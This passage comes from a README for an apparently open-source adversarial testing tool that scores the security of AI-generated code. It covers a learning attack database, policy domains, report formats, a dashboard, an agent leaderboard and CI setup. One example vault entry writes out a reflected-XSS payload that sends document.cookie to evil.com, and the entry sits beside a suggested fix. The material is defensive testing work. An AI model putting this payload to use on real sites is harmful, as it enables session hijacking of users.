│              ├─ t=28s: CWE-22  path traversal in upload             │      │
│              └─ t=35s: CWE-79  reflected XSS in error message       │      │
│                                                                     ▼      │
│                                               Arbiter scores ──► ARS: 0.87 │
└─────────────────────────────────────────────────────────────────────────┘
```

**Three attack modes:**

| Mode | Attacks | Typical time (local) | Typical cost (API) | Use case |
|------|---------|---------------------|--------------------|---------|
| `quick` | 5 | 40–90s | ~$0.08 | Every PR, fast feedback loop |
| `standard` | 20 | 3–5 min | ~$0.30 | Pre-merge gate, standard CI |
| `thorough` | 50 | 8–12 min | ~$0.75 | Release branches, compliance audits |

```bash
crucible run --issue spec.md --mode standard --pretty
```

---

### Feature 2 — The Knowledge Forge

**The problem it solves:** Every time a new AI coding tool runs, it starts cold. It knows nothing about what attacks worked against similar code last week. It will generate the same attacks it always generates, miss the same things it always misses, and provide no compound value over time.

**What it does:** After every run, CRUCIBLE writes every scored attack into the **Knowledge Forge** — a [ChromaDB](https://www.trychroma.com/) vector database embedded in `.crucible/forge/`. On the next run, the Breaker recalls the most semantically similar past attacks for this codebase fingerprint (language, surface signals, domain), incorporates their descriptions into its reasoning context, and starts from a higher adversarial baseline.

The result is a **learning curve**: the Breaker gets progressively more effective against your specific codebase patterns. It does not re-discover attacks it already discovered. It builds on them.

```
$ crucible stats --days 30 --learning-curve

  Knowledge Forge — Learning Curve (last 30 days)
  ─────────────────────────────────────────────────
  Run  1  (2026-05-29):  Forge recall:  0 attacks  ARS: 0.74  ▓░░░░░░░░░░
  Run  3  (2026-06-04):  Forge recall:  5 attacks  ARS: 0.80  ▓▓▓░░░░░░░░
  Run  6  (2026-06-11):  Forge recall: 12 attacks  ARS: 0.85  ▓▓▓▓▓░░░░░░
  Run 10  (2026-06-18):  Forge recall: 18 attacks  ARS: 0.89  ▓▓▓▓▓▓▓░░░░
  Run 14  (2026-06-25):  Forge recall: 22 attacks  ARS: 0.92  ▓▓▓▓▓▓▓▓▓░░
  Run 18  (2026-06-28):  Forge recall: 25 attacks  ARS: 0.94  ▓▓▓▓▓▓▓▓▓▓░

  Forge cache: 47 attacks stored  |  Similarity threshold: 0.75
  Top recalled CWEs: CWE-89 (12×), CWE-79 (8×), CWE-502 (6×), CWE-78 (5×)
```

The Forge is local by default — fully air-gapped, no data leaves your environment. If you opt into the Forge Network (see below), anonymized attack vectors can be shared with the community and you receive community-discovered patterns in return.

```bash
crucible stats --learning-curve   # visualize the compound improvement
crucible stats --by-cwe           # ARS breakdown by vulnerability category
crucible stats --days 90          # 90-day trend
```

---

### Feature 3 — The Forge Ledger

**The problem it solves:** ChromaDB is a vector database — powerful for similarity search, but opaque to human readers. Security engineers, auditors, and compliance teams need to read individual attack records without database tooling. They need something they can open in a text editor, commit to a repository, diff in a PR, and attach to a compliance ticket.

**What it does:** The **Forge Ledger** is a human-readable Markdown vault that lives alongside the Knowledge Forge. Every attack from every run is written as an individual Markdown file with YAML frontmatter at `.crucible/vault/<CWE-XXX>/<slug>.md`.

```
.crucible/
└── vault/
    ├── CWE-89/
    │   ├── a3f9-atk-001-sql-injection-username.md
    │   └── b7d2-atk-003-sqli-order-by-clause.md
    ├── CWE-79/
    │   └── a3f9-atk-005-xss-reflected-error-msg.md
    ├── CWE-502/
    │   └── c1e8-atk-002-pickle-deserialization.md
    └── CWE-22/
        └── a3f9-atk-004-path-traversal-upload.md
```

Each entry looks like this:

```markdown
---
cwe: CWE-79
attack_id: atk-005
severity: high
effectiveness: 0.0
verdict: missed
run_id: crucible-2026-06-28T12-00-00Z-a3f9
fingerprint: python-async-filesystem
recorded_at: 2026-06-28T12:01:43Z
---

## Attack: Reflected XSS in error response

The specification requires displaying an error message when authentication fails.
The generated code echoes the user-supplied username in the 401 response body
without applying HTML output encoding.

An attacker who sends `username=<script>document.location='https://evil.com/?c='+document.cookie</script>`
will have that payload reflected verbatim into the response body. A victim who
follows a crafted link will have their session cookie exfiltrated.

**Suggested fix:** Apply `html.escape()` to all user-controlled strings before
interpolating into HTML contexts. Use a templating engine with auto-escaping enabled.
```

Browse the vault from the CLI:

```bash
$ crucible vault --stats

  Forge Ledger — Vault Statistics
  ─────────────────────────────────────────────────────────────
  Total entries:   47 attacks across 18 runs
  CWE breakdown:
    CWE-89  SQL Injection          ████████████  12 entries  avg effectiveness: 0.0
    CWE-79  XSS                    ████████       8 entries  avg effectiveness: 0.1
    CWE-502 Deserialization        ██████         6 entries  avg effectiveness: 0.2
    CWE-78  OS Command Injection   █████          5 entries  avg effectiveness: 0.0
    CWE-22  Path Traversal         ████           4 entries  avg effectiveness: 0.0
    other                          ████████████  12 entries
  Severity: high: 28  medium: 15  low: 4
  ─────────────────────────────────────────────────────────────

$ crucible vault --cwe CWE-89 --format md    # Markdown table of all SQL injection entries
$ crucible vault --cwe CWE-79               # filter to XSS entries only
```

---

### Feature 4 — Language Profiles and Spec Fingerprinting

**The problem it solves:** A generic "run all attacks" approach wastes rounds on CWEs that don't apply to the target language or framework — prototype pollution against a Java service, or nil pointer dereference against a Python REST API. With only 5–50 attacks per run, every attack must be targeted.

**What it does:** When you run `crucible run`, the first thing CRUCIBLE does is **fingerprint the specification** — detecting the target language and surface signals from the spec text, without ever looking at generated code.

```
$ crucible run --issue spec.md --mode standard --pretty

  [fingerprint]  language:      python
  [fingerprint]  signals:       async, filesystem, user-auth, api-boundary
  [fingerprint]  framework:     detected: FastAPI patterns
  [fingerprint]  profile:       python → [CWE-89, CWE-78, CWE-502, CWE-22, CWE-94, CWE-611, CWE-918, CWE-330]
  [fingerprint]  context:       "Python async API — prioritize injection, deserialization, SSRF"
```

Detection runs in priority order to avoid misclassification: TypeScript → JavaScript → Java → Go → Python. Each language has its own CWE priority list and attack context string passed to the Breaker:

| Language | Priority CWEs | Key attack context |
|----------|-------------|-------------------|
| **JavaScript** | CWE-1321, CWE-79, CWE-94, CWE-352, CWE-601, CWE-918, CWE-362, CWE-346 | Prototype pollution, eval injection, CORS |
| **TypeScript** | JS CWEs + CWE-285 | Typed but still runtime-vulnerable |
| **Python** | CWE-89, CWE-78, CWE-502, CWE-22, CWE-94, CWE-611, CWE-918, CWE-330 | SQLi, pickle, path traversal, XXE |
| **Java** | CWE-89, CWE-502, CWE-78, CWE-611, CWE-918, CWE-863, CWE-362, CWE-22 | Deserialization, XXE, Spring auth gaps |
| **Go** | CWE-89, CWE-78, CWE-362, CWE-476, CWE-22, CWE-918, CWE-770, CWE-674 | Race conditions, nil deref, goroutine leaks |

Beyond language, CRUCIBLE detects surface signals that select sub-profiles:

```
async/Promise patterns  → prioritize race condition attacks (CWE-362)
filesystem access       → prioritize path traversal (CWE-22)
eval / dynamic exec     → prioritize injection (CWE-94)
React / Next.js         → prioritize XSS and CORS (CWE-79, CWE-346)
NestJS / Spring         → prioritize authentication and BOLA (CWE-285, CWE-639)
Go web framework        → prioritize SSRF and resource exhaustion (CWE-918, CWE-770)
```

---

### Feature 5 — BreakContext Token Compression

**The problem it solves:** The Breaker's prompt contains three inputs that can be expensive in tokens: the target specification, past attacks recalled from the Forge, and CWE context strings. In thorough mode with 50 attacks and a rich Forge recall, naive prompts can exceed 40,000 tokens per attack — prohibitively expensive at scale.

**What it does:** **BreakContext** applies three independent compression algorithms to Breaker *inputs only* — the Arbiter never sees compressed data, preserving scoring accuracy.

1. **Target compression** — extracts security-relevant lines (authentication, validation, database calls, file I/O, cryptography, authorization checks) plus a ±2 line context window. Always keeps the first 10 lines. Boring boilerplate is dropped.

2. **Forge recall deduplication** — removes past attacks with >65% Jaccard word overlap (near-duplicates provide no marginal signal to the Breaker). Each retained attack is truncated to 250 characters.

3. **CWE context collapsing** — multi-line CWE descriptions are collapsed to single lines capped at 120 characters.

```
$ crucible run --issue large_spec.md --mode thorough --pretty

  [break_context]  target:    1,240 lines → 287 lines kept  (77% reduction)
  [break_context]  recall:    18 attacks  →  11 unique kept (39% reduction)
  [break_context]  cwe_ctx:   4,200 chars →  840 chars      (80% reduction)
  [break_context]  total:     62,400 chars → 38,100 chars   (39% overall reduction)
  [break_context]  Arbiter:   NOT compressed (full fidelity for scoring)
```

BreakContext is enabled by default and can be disabled per-project:

```yaml
# .crucible.yml
combat_pair:
  break_context_enabled: false   # disable for maximum Breaker context fidelity
```

---

### Feature 6 — Adversarial Policy Engine (APE) + Policy Hub

**The problem it solves:** A generic OWASP Top 10 scan gives you generic results. A healthcare company's threat model is fundamentally different from a fintech's — and both are different from a government contractor's. Without domain context, the Breaker generates attacks that are technically valid but miss the actual regulatory exposure.

**What it does:** The **Adversarial Policy Engine** loads YAML domain playbooks that encode domain-specific threat scenarios, regulatory control mappings, and CWE priorities. The chosen domain's context is passed directly to the Breaker as policy context, steering it toward domain-relevant attacks.

**Running with HIPAA domain:**

```bash
$ crucible run --issue patient_api_spec.md --mode standard --domain hipaa --pretty

  [policy]  domain: hipaa (10 scenarios loaded)
  [policy]  context: "PHI handling — prioritize CWE-311 (unencrypted PHI), CWE-200
             (PHI disclosure in errors), CWE-359 (de-identification failure),
             CWE-287 (broken authentication to PHI endpoints)"

  ARS Score: 0.75  ❌ FAILED (gate: 0.80)

  Attack breakdown:
  ✅ CWE-311  PHI stored without encryption at rest         score: 1.0  mitigated
  ✅ CWE-287  Unauthenticated access to /patients endpoint  score: 1.0  mitigated
  ❌ CWE-200  PHI exposure in 500 error response            score: 0.0  MISSED
  ❌ CWE-359  Patient DOB returned without de-identification score: 0.0  MISSED
  ✅ CWE-532  PHI logged in access logs                     score: 1.0  mitigated
  ...
```

**Built-in domains:**

```
$ crucible policy list

  Built-in domains:
  ┌─────────────────────────┬───────────┬─────────────────────────────────────────────┐
  │ Domain                  │ Scenarios │ Focus areas                                 │
  ├─────────────────────────┼───────────┼─────────────────────────────────────────────┤
  │ owasp_top10             │ 10        │ Injection, broken auth, XSS, IDOR, misconfig│
  │ owasp_api_security      │ 10        │ BOLA, BOPLA, SSRF, unsafe deserialization   │
  │ hipaa                   │ 10        │ PHI at rest, PHI disclosure, de-identification│
  │ finra                   │  9        │ AML bypass, authorization gaps, key mgmt    │
  │ pci_dss                 │  8        │ CHD scope, network segmentation, key storage│
  │ soc2                    │  7        │ CC6/CC7/CC8 logical access controls         │
  │ nist_ssdf               │  8        │ PW.4 input validation, RV.2, PW.8           │
  └─────────────────────────┴───────────┴─────────────────────────────────────────────┘

  Installed user domains: (none)
  Install more: crucible policy hub
```

**The Policy Hub** lets you install community-contributed domains without modifying source:

```bash
$ crucible policy hub

  CRUCIBLE Policy Hub — Available Domains
  ─────────────────────────────────────────────────────────────────
  owasp_api_security   v2023.1   10 scenarios  [api, rest, graphql, owasp]
  nist_ssdf            v1.1       8 scenarios  [nist, government, supply-chain]
  cis_controls         v8.0       6 scenarios  [cis, enterprise]
  ─────────────────────────────────────────────────────────────────

$ crucible policy install owasp_api_security
  ✅ Installed owasp_api_security → .crucible/policies/owasp_api_security.yaml

$ crucible policy search "broker dealer"
  Found: finra (tag: broker-dealer, aml, finra)
```

---

### Feature 7 — SARIF 2.1.0, JUnit XML, and HTML Resilience Reports

**The problem it solves:** Security findings are only useful if they reach the people who can act on them — and in the formats those people's tools already understand. A JSON file in a reports directory is not a GitHub Code Scanning alert. A Markdown summary is not a CI dashboard test result. A PDF is not a compliance audit artifact.

**What it does:** CRUCIBLE emits three output formats simultaneously from every run, each designed for a different audience.

**SARIF 2.1.0 → GitHub Code Scanning**

Every missed attack (score < 1.0) appears as an open security alert in your repository's Security → Code Scanning view. Security teams see the CWE, severity, and description without leaving GitHub.

```bash
crucible run --issue spec.md --output-sarif crucible.sarif
# Then in GitHub Actions:
# uses: github/codeql-action/upload-sarif@v3
```

```
GitHub Security Tab — Code Scanning Alerts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠ CWE-79  HIGH    Reflected XSS in error message response
          Rule: CWE-79 | Tool: CRUCIBLE | Branch: feature/user-auth
          Introduced in: crucible-2026-06-28T12-00-00Z-a3f9

⚠ CWE-200 MEDIUM  PHI exposure in 500 error response
          Rule: CWE-200 | Tool: CRUCIBLE | Branch: feature/user-auth
```

**JUnit XML → CI Dashboards**

Every attack becomes a test case. Mitigated attacks pass. Missed attacks fail with a descriptive failure message. Works with GitHub Actions test reporters, Jenkins, GitLab CI, CircleCI — any tool that reads JUnit XML.

```
GitHub Actions — CRUCIBLE Attack Results
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ CWE-89: SQL Injection via username param          PASSED
✅ CWE-502: Unsafe deserialization — pickle object   PASSED
✅ CWE-78: OS command injection in file path         PASSED
✅ CWE-22: Path traversal in upload handler          PASSED
❌ CWE-79: Reflected XSS in error message            FAILED
   └ No output encoding applied to user-controlled error content
```

**HTML Resilience Report → Compliance Evidence**

A self-contained HTML document with the full run summary, attack table, control mappings, and tamper-evident hash — downloadable from the Combat Dashboard for attachment to compliance tickets, audit packages, and board security reports.

```bash
crucible report <run_id> --format html > report.html
# Or download from Combat Dashboard at /api/runs/<run_id>/html
```

---

### Feature 8 — Combat Dashboard

**The problem it solves:** Individual run reports are useful for developers who run CRUCIBLE manually. But for security teams managing 50 repositories and hundreds of runs per week, you need a centralized view: ARS trends over time, runs that failed the gate, evidence download for auditors, Forge Ledger statistics.

**What it does:** The **Combat Dashboard** is a FastAPI web application (optional — `pip install crucible-ai[ui]`) that reads all reports from `.crucible/reports/` and presents them in a browser.

```bash
pip install "crucible-ai[ui]"
crucible dashboard --port 8080
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ ⚔️  CRUCIBLE Combat Dashboard                    [ARS Gate: 0.80]            │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                               │
│  TOTAL RUNS    GATE PASSED    GATE FAILED    AVG ARS                         │
│  ┌─────────┐  ┌─────────┐   ┌─────────┐   ┌─────────┐                       │
│  │   47    │  │   38    │   │    9    │   │  0.871  │                       │
│  └─────────┘  └─────────┘   └─────────┘   └─────────┘                       │
│                                                                               │
│  ARS Trend — Last 20 Runs                                                    │
│  1.0 ┤                              ●    ●                                   │
│  0.9 ┤          ●    ●    ●    ●─●─●    ●─●                                  │
│  0.8 ┤ ──── ●─● │                            ●    ●──●                       │
│  0.7 ┤     ○                                     ○                           │
│      └──────────────────────────────────────────────── (runs, newest right)  │
│        ● = PASS (ARS ≥ 0.80)    ○ = FAIL (ARS < 0.80)                       │
│                                                                               │
│  Runs (47)                                                                   │
│  ┌──────────────────┬───────┬──────┬─────────┬───────┬────────────────────┐ │
│  │ Run ID           │  ARS  │ Gate │ Attacks │ Missed│ Download           │ │
│  ├──────────────────┼───────┼──────┼─────────┼───────┼────────────────────┤ │
│  │ ...Z-a3f9        │ 0.870 │ PASS │    20   │   2   │ [HTML][SARIF][XML] │ │
│  │ ...Z-b7d2        │ 0.750 │ FAIL │    20   │   5   │ [HTML][SARIF][XML] │ │
│  │ ...Z-c1e8        │ 0.900 │ PASS │    20   │   2   │ [HTML][SARIF][XML] │ │
│  └──────────────────┴───────┴──────┴─────────┴───────┴────────────────────┘ │
└──────────────────────────────────────────────────────────────────────────────┘
```

The Dashboard exposes a REST API (`/api/runs`, `/api/runs/{id}`, `/api/vault/stats`) so it integrates with existing security dashboards — Grafana, Splunk, Datadog — via standard HTTP.

---

### Feature 9 — ARS Leaderboard — Benchmarking AI Coding Agents

**The problem it solves:** SWE-bench measures whether an AI agent fixed the bug. It does not measure whether the fix introduced new vulnerabilities or left the attack surface undefended. As AI coding agents proliferate — Devin, SWE-agent, custom fine-tunes — teams need a security dimension to the evaluation.

**What it does:** CRUCIBLE can score multiple AI agents against the same task set and rank them by adversarial resilience. Name your reports `<agent-name>--<task-id>.json` and run:

```bash
crucible leaderboard \
  --reports-dir .crucible/reports \
  --output docs/leaderboard.html
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ ⚔️  CRUCIBLE ARS Leaderboard            Rank = avg_ARS×0.6 + pass_rate×0.4  │
│    ARS Gate: 0.80 │ 4 agents │ 20 tasks                                      │
├──────┬──────────────────┬─────────┬────────┬───────┬───────┬───────┬────────┤
│ Rank │ Agent            │ Avg ARS │ Median │   Min │   Max │ Tasks │  Pass% │
├──────┼──────────────────┼─────────┼────────┼───────┼───────┼───────┼────────┤
│  🥇  │ agent-alpha      │  0.912  │  0.920 │ 0.800 │ 1.000 │   20  │ 95.0% │
│  🥈  │ agent-beta       │  0.871  │  0.880 │ 0.750 │ 0.960 │   20  │ 80.0% │
│  🥉  │ agent-gamma      │  0.834  │  0.840 │ 0.650 │ 0.920 │   20  │ 70.0% │
│  #4  │ agent-delta      │  0.721  │  0.720 │ 0.500 │ 0.880 │   20  │ 45.0% │
└──────┴──────────────────┴─────────┴────────┴───────┴───────┴───────┴────────┘
```

The output is a self-contained, sortable HTML page — click any column header to re-sort. Publish to GitHub Pages via `docs/leaderboard.html`. A JSONL input format is also supported for importing scores from external tools:

```bash
# JSONL format: one line per (agent, task) pair
echo '{"agent_name":"gpt4o","task_id":"django-001","ars_score":0.85,"attack_count":20,"miss_count":3}' >> scores.jsonl
crucible leaderboard --jsonl scores.jsonl --output docs/leaderboard.html
```

---

### Feature 10 — Enterprise RBAC (GitHub Team-Based Access Control)

**The problem it solves:** When CRUCIBLE runs as a shared service across an engineering organization, not everyone should have the same permissions. A junior engineer should be able to view reports but not override the ARS gate on a release branch. A security lead should be able to install new policy domains. A PR author should not be able to suppress their own failed run.

**What it does:** CRUCIBLE maps GitHub team membership to three roles with a strict permission hierarchy. Role lookups hit the GitHub API once and are cached for 5 minutes — network failures degrade gracefully to `DEVELOPER` (least privilege).

```
$ crucible serve --rbac --port 8080

  [rbac] RBAC enabled — GitHub org: acme-corp
  [rbac] Admin teams:    security-leads, platform-admin
  [rbac] Reviewer teams: backend-leads, security-review
  [rbac] Developer:      any authenticated GitHub user

  Role resolution:
  ┌────────────────────────────────────────────────────────────────────┐
  │ Role       │ Capabilities                                          │
  ├────────────┼───────────────────────────────────────────────────────┤
  │ Admin      │ Manage policies, set ARS gate, manage team assignments │
  │ Reviewer   │ Trigger re-runs, override gate on individual PRs      │
  │ Developer  │ View reports, download evidence (read-only)           │
  └────────────┴───────────────────────────────────────────────────────┘
```

```bash
# Configure via environment (never in config files — team names are org-specific)
export CRUCIBLE_RBAC_ENABLED=true
export GITHUB_ORG=acme-corp
export CRUCIBLE_ADMIN_TEAMS=security-leads,platform-admin
export CRUCIBLE_REVIEWER_TEAMS=backend-leads,security-review
# CRUCIBLE_DEV_TEAMS defaults to: any authenticated GitHub user
```

---

### Feature 11 — Forge Network (Opt-In Community Pattern Sharing)

**The problem it solves:** The Knowledge Forge learns from your runs — but only your runs. A healthcare company might discover a novel PHI-exfiltration attack pattern in their HIPAA domain. A fintech might discover a new BOLA pattern in their trading API. These discoveries are valuable to the entire community — but no existing tool has a mechanism for sharing adversarial patterns without sharing sensitive code or business context.

**What it does:** The **Forge Network** lets you share anonymized attack patterns with the community and receive patterns discovered by others. What is shared:

- The attack vector description (text only, ≤500 characters)
- The CWE identifier
- The severity level
- The verdict (mitigated / partial / missed)
- The target language

What is **never** shared: your code, your specification, your repository name, your organization, or any personally identifiable information.

A stable 16-character anonymous contributor ID (SHA-256 of your git remote URL) identifies contributions — no usernames, no email addresses.

```bash
$ export CRUCIBLE_FORGE_NETWORK_ENABLED=true

$ crucible forge-network status

  Forge Network Status
  ─────────────────────────────────────────────────────────────
  Status:          ENABLED
  Hub:             https://forge-network.crucible.dev
  Contributor ID:  a7f3b2c91d4e5f60  (anonymous, derived from git remote)
  Min ARS to share: 0.85 (high-quality mitigations + all missed attacks)
  ─────────────────────────────────────────────────────────────
  Hub statistics:
    Total patterns:  12,847
    Top CWEs:        CWE-89 (3,241), CWE-79 (2,108), CWE-502 (1,876)
    Languages:       Python (4,120), JavaScript (3,847), Java (2,341), Go (1,891)

$ crucible forge-network pull CWE-89
  ✅ Pulled 42 SQL injection patterns from community hub
     Top vectors: UNION SELECT bypass, stacked queries, error-based extraction
     → Added to Forge recall context for next run
```

---

### Feature 12 — Slack + Jira Alerts on Low-ARS Runs

**The problem it solves:** A failed CI gate stops a merge — but it does not notify the security team, create a ticket for tracking, or capture the finding in the tool the team uses for vulnerability management. Security events that only exist in CI logs get lost.

**What it does:** When ARS falls below `minimum_ars`, CRUCIBLE dispatches:

1. A **Slack attachment** to the configured webhook with the run summary, top missed attacks, and a direct link to the Resilience Report
2. A **Jira ticket** in the configured project with full attack descriptions, CWE references, severity, and the run ID for traceability

Both are best-effort — a network failure on the notification path never blocks the CI gate or report generation.

**Slack message (sent automatically when ARS < 0.80):**

```
┌──────────────────────────────────────────────────────────────────────┐
│ 🔴 CRUCIBLE Security Alert — ARS Gate Failed                          │
│                                                                       │
│ Run ID:    crucible-2026-06-28T12-00-00Z-a3f9                        │
│ ARS Score: 0.75  ❌  (required: ≥ 0.80)                               │
│ Branch:    feature/payment-processor                                  │
│                                                                       │
│ Top missed attacks:                                                   │
│   ❌ CWE-89  SQL injection via transaction_id param    score: 0.0     │
│   ❌ CWE-200 Account balance exposed in error response score: 0.0     │
│   ⚠️  CWE-502 Partial deserialization defense          score: 0.5     │
│                                                                       │
│ [View Report]  [Download SARIF]  [Open Jira Ticket]                  │
└──────────────────────────────────────────────────────────────────────┘
```

```bash
# Configure via environment variables (never in .crucible.yml)
export SLACK_WEBHOOK_URL=https://hooks.slack.com/services/T.../B.../...
export JIRA_BASE_URL=https://your-org.atlassian.net
export JIRA_PROJECT=SEC
export JIRA_TOKEN=your-api-token
```

---

### Feature 13 — Domain Intelligence Adapter (Live Threat Intel via MCP)

**The problem it solves:** CWE profiles and regulatory playbooks encode *historical* threat knowledge — patterns that were known when the profiles were written. Financial services, healthcare, and government security teams operate with live threat feeds: active CVEs, current attack campaigns, real-time intelligence about what threat actors are targeting today. This context should inform what the Breaker tests.

**What it does:** The **Domain Intelligence Adapter (DIA)** consumes live threat intelligence from [Model Context Protocol (MCP)](https://modelcontextprotocol.io) servers — real-time threat feeds, CVE databases, sector-specific intelligence services — and enriches the Breaker's policy context before each run.

```yaml
# .crucible.yml — connect CRUCIBLE to your threat intel MCP server
mcp_servers:
  - name: fin-intel
    url: http://your-threat-intel-server:8090/mcp
    tool: get_finra_threats
    params:
      sector: broker-dealer
    enabled: true
```

```
$ crucible run --issue trading_api_spec.md --mode standard --domain finra --pretty

  [dia]  fin-intel: enriching policy context...
  [dia]  fin-intel: ✅ received 2,100 chars of live threat intel
  [dia]  context enriched: "FINRA broker-dealer — 2026-06-28 threat update:
          Active campaign targeting order routing APIs with BOLA attacks;
          CVE-2026-4421 affects common JWT validation libraries;
          Elevated AML bypass attempts via layered micro-transaction patterns"
  [policy]  domain: finra + live intel (enriched)
  ...
```

> **Note:** CRUCIBLE is a *consumer* of MCP servers — it calls them via JSON-RPC 2.0 `tools/call`. CRUCIBLE does not implement the MCP server protocol. Its 60–90s runtime is architecturally incompatible with MCP's sub-second response contract.

---

### Feature 14 — Air-Gap / Full On-Premises Operation

**The problem it solves:** Every cloud-based security tool creates a data sovereignty problem. If your code generation prompt or your specification contains proprietary business logic — and it will, for any real-world enterprise — sending it to an external API endpoint is a compliance risk. Healthcare companies cannot send PHI context to a cloud model. Defense contractors cannot send specification text to an external API. Financial institutions face regulatory constraints on what data leaves their network.

**What it does:** CRUCIBLE's entire engine runs offline using [Ollama](https://ollama.ai). No internet connection required. No data leaves your network. ChromaDB runs as an embedded database — no external vector DB service needed. All reports stay local.

```yaml
# .crucible.yml — full air-gap configuration
deployment:
  model_provider: local
  local_model: llama3.3:70b    # or llama3.1:8b, mistral:7b, codellama:34b
```

```bash
# Verify no network calls are made
crucible doctor --strict
# ✅ Model:   llama3.3:70b (local Ollama, no outbound calls)
# ✅ Forge:   ChromaDB embedded at .crucible/forge/ (no external DB)
# ✅ Ledger:  .crucible/vault/ (local filesystem only)
# ✅ Reports: .crucible/reports/ (local filesystem only)
# ✅ Telemetry: NONE
```

For Docker-based on-premises deployment:

```bash
# Self-contained stack — everything in your private network
docker compose up -d    # ChromaDB + CRUCIBLE + (optionally) Ollama
```

---

## 📦 Installation

### pip

```bash
pip install crucible-ai                   # core engine (Ollama or API key)
pip install "crucible-ai[ui]"             # + Combat Dashboard (FastAPI web UI)
```

### From source

```bash
git clone https://github.com/sanjoy1234/crucible.git
cd crucible
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
crucible doctor                           # verify all systems
```

### Docker Compose (full stack — ChromaDB included)

```bash
git clone https://github.com/sanjoy1234/crucible.git
cd crucible
docker compose up -d                      # ChromaDB + CRUCIBLE

docker compose run crucible \
  crucible run --issue /app/examples/demo_issue.md --mode quick

open http://localhost:8080                # Combat Dashboard
```

---

## 🔁 GitHub Actions — CI/CD Adversarial Gate

Add this to `.github/workflows/crucible.yml`. Every PR is adversarially tested before it can merge — zero changes to the developer's workflow.

```yaml
name: CRUCIBLE Adversarial Gate
on:
  pull_request:
    branches: [main, develop]

jobs:
  crucible:
    name: Adversarial Resilience Check
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
      security-events: write
      statuses: write

    steps:
      - uses: actions/checkout@v4

      - name: Install CRUCIBLE
        run: pip install crucible-ai

      - name: Verify environment
        run: crucible validate
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}

      - name: Run CombatPair
        run: |
          crucible run \
            --issue "${{ github.event.pull_request.html_url }}" \
            --mode standard \
            --domain owasp_top10 \
            --output-sarif crucible.sarif \
            --output-junit crucible.xml
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Upload SARIF to GitHub Code Scanning
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: crucible.sarif

      - name: Publish JUnit results
        uses: mikepenz/action-junit-report@v4
        if: always()
        with:
          report_paths: crucible.xml
          check_name: CRUCIBLE Attack Results
```

CRUCIBLE posts the ARS as a commit status. With `GITHUB_TOKEN` set, it also adds a PR comment with the full attack table. `fail_open: false` in `.crucible.yml` blocks the merge if ARS < 0.80.

---

## 🏆 CRUCIBLE in the Security Toolchain — Competitive Positioning

> *"We already have Snyk and Veracode. Does our enterprise really need another security tool?"*

This is a fair question. The enterprise application security market has mature, well-integrated tools. Before evaluating CRUCIBLE, you should understand what each category of existing tool does — and the structural gap that none of them close.

### What existing AppSec tools do — and what they cannot do

**Software Composition Analysis (SCA) — Snyk, Endor Labs, GHAS Dependabot**

SCA tools inventory your dependency graph and flag components with known CVEs. They are excellent at what they do: if your Python service imports a library version with a known SQL injection flaw, Snyk will catch it and suggest a fix.

What they cannot do: test the *code your team wrote* (or your AI agent generated) for adversarial resilience. SCA sees your `requirements.txt` or `package.json`, not your application logic. If your team writes SQL injection into bespoke application code — as happened in every MOVEit-class incident — SCA has nothing to say about it, because the vulnerability is not in a dependency; it is in the code itself.

**Static Application Security Testing (SAST) — Veracode, Checkmarx, Semgrep, SonarQube, GitHub CodeQL**

SAST tools analyze source code for patterns that match known vulnerability signatures. They are effective at finding taint flows — tracking user-controlled input from source (HTTP parameter) to sink (SQL statement, HTML output, system call). They are the closest existing category to what CRUCIBLE does.

The fundamental limitation of SAST is structural: **SAST tests implementations**. It requires the code to exist before it can run. It pattern-matches against what was built. It finds vulnerabilities that are detectable from static code analysis — a well-defined but incomplete subset of the adversarial attack surface.

In the AI coding agent era, SAST has three compounding limitations:

1. **Volume:** AI agents generate complete feature implementations in minutes, at a pace that has outpaced SAST review cycles. Most enterprise SAST scans run nightly or weekly — too slow for a development team shipping multiple AI-generated features per day.

2. **Novel patterns:** SAST rules match known vulnerability signatures. When AI models introduce new patterns of incorrect code — such as the systematic SSRF pattern found in every AI agent tested by Tenzai in 2025 — SAST rules don't detect it until the pattern is formally catalogued as a signature.

3. **Anchoring to implementation:** SAST can only analyze what was written. It cannot reason about what the code *should have defended against* based on the specification's implicit threat model. If an AI generates code that perfectly implements the spec but the spec's trust model implies a PHI exposure risk that the code doesn't address — SAST won't see the gap, because there is no code to scan for it. The vulnerability is an absence, not a pattern.

**Dynamic Application Security Testing (DAST) — StackHawk, OWASP ZAP, BurpSuite**

DAST tools probe a running application for vulnerabilities by sending adversarial HTTP requests and analyzing responses. They are the gold standard for finding runtime vulnerabilities that SAST misses.

DAST requires a deployed, running application. It operates entirely post-build and post-deployment. A DAST scan cannot run on a PR — it requires a staging environment. This places it far downstream from the generation event, where remediation costs are orders of magnitude higher.

**Human Penetration Testing**

Expert human pentesters provide the deepest and most creative adversarial coverage available. They chain vulnerabilities, discover novel attack paths, and reason about business logic in ways no automated tool can replicate.

Penetration tests are typically performed quarterly or annually, cost $50,000–$200,000+ per engagement, and produce findings that must be remediated against code that has been in production for months. They are essential and irreplaceable. They operate at a time scale that is incompatible with preventing vulnerabilities from entering production.

**AI Coding Assistants — GitHub Copilot, Cursor, Devin, SWE-agent, OpenHands**

These tools generate code. They do not adversarially test it. They have no mechanism for producing a security score on the code they generate. When they deliver a feature implementation, they deliver *functionally plausible code with no adversarial assessment*.

The 2022 Pearce et al. study found Copilot generated vulnerable code in approximately 40% of security-sensitive contexts. Georgetown CSET found XSS vulnerabilities in 86% of AI-generated code samples across five major LLMs. These tools have no internal mechanism for catching their own security misses — that is architecturally outside their scope.

### The gap none of them close

Every tool above shares one fundamental assumption: **the code already exists when security assessment begins.**

```
Traditional AppSec timeline:

 Spec  →  AI generates code  →  PR opens  →  SAST scan  →  Code review  →  Merge
                                                  ↑               ↑
                                      Post-generation       Post-generation
                                      (code anchored)       (human anchored)

                                      DAST → Pentest → Incident response
                                           ↑              ↑
                                   Post-deployment    Post-breach
```

